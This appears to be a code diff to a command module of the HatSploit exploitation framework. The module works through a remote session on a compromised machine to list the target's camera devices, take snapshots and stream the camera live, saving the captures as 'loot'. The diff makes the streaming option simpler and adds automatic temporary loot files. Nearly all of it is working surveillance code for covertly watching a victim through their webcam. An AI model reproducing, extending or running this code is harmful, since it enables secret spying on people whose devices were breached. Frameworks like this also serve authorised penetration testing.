@@ -3,6 +3,7 @@ This command requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
+import os
 import sys
 import threading
 
@@ -39,7 +40,7 @@ class HatSploitCommand(Command):
             'Options': {
                 '-l': ['', 'List all camera devices.'],
                 '-s': ['<id> <path>', 'Take a snapshot using device.'],
-                '-r': ['<id> <viewer> <path>', 'Stream device in real time.']
+                '-r': ['<id>', 'Stream device in real time.']
             }
         }
 
@@ -69,39 +70,44 @@ class HatSploitCommand(Command):
 
     def run(self, argc, argv):
         if argv[1] == '-r':
-            if argc > 4:
-                result = self.session.send_command(
-                    tag=CAM_START,
-                    args={
-                        CAM_ID: int(argv[2])-1,
-                    }
-                )
+            result = self.session.send_command(
+                tag=CAM_START,
+                args={
+                    CAM_ID: int(argv[2])-1,
+                }
+            )
 
-                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                    self.print_error(f"Failed to open device #{argv[2]}!")
-                    return
+            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+                self.print_error(f"Failed to open device #{argv[2]}!")
+                return
 
-                thread = threading.Thread(target=self.read_thread, args=(argv[4],))
-                thread.setDaemon(True)
-                thread.start()
+            file = self.session.loot.random_loot('png')
+            path = self.session.loot.random_loot('html')
 
-                client = StreamClient(path=argv[3], image=argv[4])
-                client.create_video()
+            thread = threading.Thread(target=self.read_thread, args=(file,))
+            thread.setDaemon(True)
+            thread.start()
 
-                self.print_process(f"Streaming device #{argv[2]}...")
-                self.print_information("Press Ctrl-C to stop.")
+            client = StreamClient(path=path, image=file)
+            client.create_video()
 
-                try:
-                    client.stream()
-                    for _ in sys.stdin:
-                        pass
+            self.print_process(f"Streaming device #{argv[2]}...")
+            self.print_information("Press Ctrl-C to stop.")
 
-                except KeyboardInterrupt:
-                    self.print_process("Stopping...")
-                    self.stop = True
+            try:
+                client.stream()
+                for _ in sys.stdin:
+                    pass
 
-                thread.join()
-                self.session.send_command(tag=CAM_STOP)
+            except KeyboardInterrupt:
+                self.print_process("Stopping...")
+                self.stop = True
+
+            thread.join()
+
+            self.session.send_command(tag=CAM_STOP)
+            self.session.loot.remove_loot(file)
+            self.session.loot.remove_loot(path)
 
         elif argv[1] == '-l':
             result = self.session.send_command(
@@ -118,33 +124,32 @@ class HatSploitCommand(Command):
                 device = result.get_string(TLV_TYPE_STRING)
 
         elif argv[1] == '-s':
-            if argc > 3:
-                result = self.session.send_command(
-                    tag=CAM_START,
-                    args={
-                        CAM_ID: int(argv[2])-1,
-                    }
-                )
+            result = self.session.send_command(
+                tag=CAM_START,
+                args={
+                    CAM_ID: int(argv[2])-1,
+                }
+            )
 
-                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                    self.print_error(f"Failed to open device #{argv[2]}!")
-                    return
+            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+                self.print_error(f"Failed to open device #{argv[2]}!")
+                return
 
-                result = self.session.send_command(
-                    tag=CAM_FRAME
-                )
+            result = self.session.send_command(
+                tag=CAM_FRAME
+            )
 
-                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
-                    self.print_error(f"Failed to read device #{argv[2]}!")
-                    self.session.send_command(tag=CAM_STOP)
-                    return
-
-                frame = result.get_raw(TLV_TYPE_BYTES)
-
-                try:
-                    with open(argv[3], 'wb') as f:
-                        f.write(frame)
-                except Exception:
-                    self.print_error(f"Failed to write image to {argv[3]}!")
-
+            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
+                self.print_error(f"Failed to read device #{argv[2]}!")
                 self.session.send_command(tag=CAM_STOP)
+                return
+
+            frame = result.get_raw(TLV_TYPE_BYTES)
+
+            try:
+                with open(argv[3], 'wb') as f:
+                    f.write(frame)
+            except Exception:
+                self.print_error(f"Failed to write image to {argv[3]}!")
+
+            self.session.send_command(tag=CAM_STOP)
